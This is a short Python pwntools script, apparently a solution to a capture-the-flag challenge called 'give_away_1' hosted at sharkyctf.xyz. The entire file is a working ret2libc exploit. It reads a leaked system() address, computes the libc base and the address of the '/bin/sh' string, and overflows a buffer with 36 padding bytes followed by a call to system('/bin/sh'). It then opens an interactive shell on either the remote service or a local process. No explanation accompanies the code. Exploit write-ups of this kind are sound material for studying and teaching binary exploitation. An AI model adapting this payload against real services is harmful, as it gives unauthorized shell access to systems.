import sys
from pwn import *

offset = 36

if sys.argv[1] == "r":
    r = remote("sharkyctf.xyz", 20334)
    system_offset = 0x0003d200
    binsh_offset = 0x17e0cf
else:
    r = process("give_away_1")
    system_offset = 0x00044a00
    binsh_offset = 0x18e32b
    print(r.pid)
    sleep(5)

r.recvuntil("Give away: ")
system_addr = int(r.recvline(), 16)
libc_base = system_addr - system_offset
binsh_addr = libc_base + binsh_offset

log.info("system_addr = {}".format(hex(system_addr)))
log.info("binsh_addr = {}".format(hex(binsh_addr)))

payload = b"A" * offset
payload += p32(system_addr) + b"AAAA" + p32(binsh_addr)
r.sendline(payload)

r.interactive()
